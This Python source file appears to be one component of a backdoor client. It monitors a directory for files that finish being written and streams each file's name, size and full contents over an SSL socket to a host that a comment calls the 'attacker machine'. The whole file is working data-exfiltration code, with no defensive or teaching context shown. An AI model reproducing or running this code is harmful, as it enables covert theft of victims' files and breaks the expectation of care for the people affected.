import pyinotify
import client_config
import os
import socket, ssl

KILL_PROCESS = False
INOTIFY_SOCK = ""


class Handler(pyinotify.ProcessEvent):
    def process_IN_CLOSE_WRITE(self, event):
        global INOTIFY_SOCK
        print event.pathname
        print event.pathname.split('/')[-1]+" "+str(os.path.getsize(event.pathname))
        INOTIFY_SOCK.send(event.pathname.split('/')[-1]+" "+str(os.path.getsize(event.pathname)))
        with open(event.pathname) as f:
            content = f.read()
            while content:
                INOTIFY_SOCK.send(content)
                content = f.read()
        #ssl_sock.close()


def notify(path):
    wm = pyinotify.WatchManager()
    notifier = pyinotify.ThreadedNotifier(wm, Handler())

    global INOTIFY_SOCK
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # wrap with SSL
    INOTIFY_SOCK = ssl.wrap_socket(s, ca_certs="./../certificate/server.crt", cert_reqs=ssl.CERT_REQUIRED)
    # connect to attacker machine
    INOTIFY_SOCK.connect((client_config.DESTINATION, client_config.INOTIFY_PORT))

    notifier.start()
    mask = pyinotify.IN_CLOSE_WRITE
    wdd = wm.add_watch(path, mask)

    global KILL_PROCESS
    while True:
        if KILL_PROCESS:
            print KILL_PROCESS
            break

    wm.rm_watch(wdd.values())
    notifier.stop()


if __name__ == '__main__':
    notify(".")